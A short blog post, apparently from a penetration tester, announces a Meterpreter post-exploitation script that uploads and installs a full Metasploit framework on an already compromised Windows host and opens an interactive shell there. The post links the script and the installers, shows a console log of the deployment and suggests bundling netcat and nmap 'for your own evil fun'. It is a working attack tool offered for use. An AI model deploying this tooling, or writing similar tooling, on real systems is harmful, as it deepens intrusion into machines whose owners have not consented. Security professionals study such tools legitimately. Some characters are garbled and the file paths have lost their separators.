Well, sortaâ€¦  
  
I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.  
  
_Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right._  
  
You can download the script here: [https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb](https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb)  
  
You can download the cygwin installs from the metasploit website:  
  
* 13mb FULL framework: [framework-3.3-dev.exe](https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/framework-3.3-dev.exe?raw=true)
* 5mb MINI (just msfconsole): [mini-3.3-dev.exe](https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/mini-3.3-dev.exe?raw=true)

And here is what it looks like:

```
meterpreter > run deploymsf -f framework-3.3-dev.exe  
[*] Running Meterpreter MSFp Deploytment Script.....  
[*] Uploading MSFp for for deployment....  
[*] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe  
[*] Installing MSFp...........  
[*] Done!  
[*] Installation Complete!  
[*] Running cygwin shell channelized...  
[*] Channel 18 created - Type: interact 18 to play  
[*] Be warned, it takes a bit for post setup to happen  
[*] and you will not see a prompt, try pwd to check  
meterpreter > interact 18
